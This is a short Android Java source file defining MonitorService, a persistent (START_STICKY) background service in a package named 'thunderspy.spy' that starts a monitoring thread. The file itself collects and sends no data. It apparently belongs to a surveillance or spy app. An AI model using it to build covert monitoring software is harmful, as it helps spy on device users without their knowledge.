package com.thunderspy.spy;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;

import com.thunderspy.spy.utils.ApplicationContextManager;
import com.thunderspy.spy.utils.Constants;
import com.thunderspy.spy.utils.MonitorServiceThread;
import com.thunderspy.spy.utils.ThreadPoolManager;
import com.thunderspy.spy.utils.Utils;
import com.thunderspy.spy.utils.etp.ETPThread;

public class MonitorService extends Service {
    private final int START_MODE = START_STICKY;

    public MonitorService() {

    }

    @Override
    public void onCreate() {
        ApplicationContextManager.initApplicationContext(this.getApplicationContext());
        initSetup();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        initSetup();
        return START_MODE;
    }

    private void initSetup() {
        try {
            MonitorServiceThread.setupMonitorServiceThread();
        } catch (Exception exp) {
            Utils.log("Initial setup for Monitor Service could not be done: %s", exp.getMessage());
        }
    }


    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    @Override
    public boolean onUnbind(Intent intent) {
        return false;
    }
    @Override
    public void onRebind(Intent intent) {

    }
    @Override
    public void onDestroy() {

    }
}
